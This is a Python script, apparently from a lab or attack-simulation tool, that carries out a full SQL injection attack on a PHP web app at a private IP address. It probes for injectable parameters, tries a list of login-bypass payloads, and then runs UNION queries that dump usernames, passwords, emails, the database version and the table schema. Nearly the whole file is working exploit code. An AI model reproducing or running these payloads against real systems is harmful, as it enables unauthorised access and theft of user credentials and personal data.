import requests
import datetime
import queue


# Classic SQL injection payloads for login bypass
LOGIN_BYPASS_PAYLOADS = [
    ("' OR '1'='1' #",        "anything"),   # always true
    ("admin' #",              "anything"),   # comment out password check
    ("' OR 1=1 #",            "anything"),   # numeric always true
    ("admin' OR '1'='1",      "anything"),   # no comment needed
    ("' OR 'x'='x' #",       "anything"),   # string always true
    ("\" OR \"1\"=\"1\" #",   "anything"),   # double quote variant
]

# UNION payloads to extract data from the users table via search.php
# Using # as comment — more reliable than -- in MySQL via HTTP
UNION_PAYLOADS = [
    {
        "label": "Detect column count (3 columns)",
        "payload": "' UNION SELECT NULL,NULL,NULL #",
    },
    {
        "label": "Confirm string columns",
        "payload": "' UNION SELECT 'a','b','c' #",
    },
    {
        "label": "Dump all usernames and emails",
        "payload": "' UNION SELECT username,email,role FROM users #",
    },
    {
        "label": "Dump all usernames and passwords",
        "payload": "' UNION SELECT username,password,role FROM users #",
    },
    {
        "label": "Read MySQL version",
        "payload": "' UNION SELECT @@version,@@hostname,@@datadir #",
    },
    {
        "label": "List all tables in webapp DB",
        "payload": "' UNION SELECT table_name,table_schema,NULL FROM information_schema.tables WHERE table_schema='webapp' #",
    },
]


def probe_injectable(url, log_queue):
    """Send a single quote to see if the app reveals a SQL error."""
    log_queue.put("INFO: Probing for SQL injection vulnerability...")
    try:
        resp = requests.get(url, params={"q": "'"}, timeout=5)
        body = resp.text
        if any(kw in body.lower() for kw in ["sql", "mysql", "syntax", "error", "warning"]):
            log_queue.put("VULN: SQL error detected in response — target is INJECTABLE")
            return True
        else:
            log_queue.put("INFO: No SQL error visible — may still be injectable (blind)")
            return False
    except Exception as e:
        log_queue.put(f"ERROR: Probe failed — {e}")
        return False


def run_login_bypass(login_url, log_queue, stop_event):
    """Try login bypass payloads against the login form."""
    log_queue.put(f"INFO: Target → {login_url}")
    log_queue.put(f"INFO: Phase 1 — Login Bypass ({len(LOGIN_BYPASS_PAYLOADS)} payloads)")

    found = None

    for username_payload, password in LOGIN_BYPASS_PAYLOADS:
        if stop_event.is_set():
            log_queue.put("INFO: Stopped by user")
            break

        ts = datetime.datetime.now().strftime("%H:%M:%S")
        try:
            resp = requests.post(
                login_url,
                data={"username": username_payload, "password": password},
                timeout=5,
                allow_redirects=False,
            )

            if resp.status_code in (301, 302):
                log_queue.put(f"SUCCESS [{ts}] Login bypassed!")
                log_queue.put(f"SUCCESS Payload: username={username_payload!r}")
                log_queue.put(f"SUCCESS Redirected to: {resp.headers.get('Location', '?')}")
                found = username_payload
                break
            else:
                log_queue.put(f"FAILED  [{ts}] {username_payload!r} — no redirect")

        except Exception as e:
            log_queue.put(f"ERROR   [{ts}] {username_payload!r} — {e}")

    return found


def run_union_extraction(search_url, log_queue, stop_event):
    """Run UNION-based payloads against search.php to extract DB data."""
    log_queue.put(f"INFO: Phase 2 — UNION Extraction ({len(UNION_PAYLOADS)} payloads)")
    log_queue.put(f"INFO: Target → {search_url}")

    results = []

    for item in UNION_PAYLOADS:
        if stop_event.is_set():
            log_queue.put("INFO: Stopped by user")
            break

        ts    = datetime.datetime.now().strftime("%H:%M:%S")
        label = item["label"]
        payload = item["payload"]

        try:
            resp = requests.get(search_url, params={"q": payload}, timeout=5)
            body = resp.text

            # Parse table rows from HTML response
            rows = []
            import re
            tds = re.findall(r"<td>(.*?)</td>", body, re.IGNORECASE | re.DOTALL)
            if tds:
                # Group into rows of 3 (username, email/data, role)
                for i in range(0, len(tds), 3):
                    chunk = tds[i:i+3]
                    rows.append(" | ".join(chunk))

            if rows:
                log_queue.put(f"EXTRACT [{ts}] {label}")
                for row in rows:
                    log_queue.put(f"DATA    {row}")
                results.append({"label": label, "payload": payload, "rows": rows})
            else:
                log_queue.put(f"EMPTY   [{ts}] {label} — no rows returned")

        except Exception as e:
            log_queue.put(f"ERROR   [{ts}] {label} — {e}")

    log_queue.put(f"INFO: Extraction complete — {len(results)} payloads returned data")
    log_queue.put("INFO: MITRE ATT&CK: T1190 — Exploit Public-Facing Application")
    log_queue.put("DONE")
    return results


def run_sqli_attack(login_url, search_url, log_queue, stop_event):
    """Full SQL injection attack: probe → login bypass → data extraction."""
    log_queue.put("INFO: Starting SQL Injection attack")
    log_queue.put("INFO: MITRE ATT&CK: T1190 — Exploit Public-Facing Application")

    # Phase 0 — probe
    probe_injectable(search_url, log_queue)

    # Phase 1 — login bypass
    bypass_payload = run_login_bypass(login_url, log_queue, stop_event)

    # Phase 2 — data extraction
    extracted = run_union_extraction(search_url, log_queue, stop_event)

    log_queue.put("DONE")
    return {
        "bypass_payload": bypass_payload,
        "extracted":      extracted,
    }


if __name__ == "__main__":
    import threading
    import queue as q

    lq   = q.Queue()
    stop = threading.Event()

    run_sqli_attack(
        login_url="http://172.22.229.213:8888/login.php",
        search_url="http://172.22.229.213:8888/search.php",
        log_queue=lq,
        stop_event=stop,
    )

    while not lq.empty():
        print(lq.get())
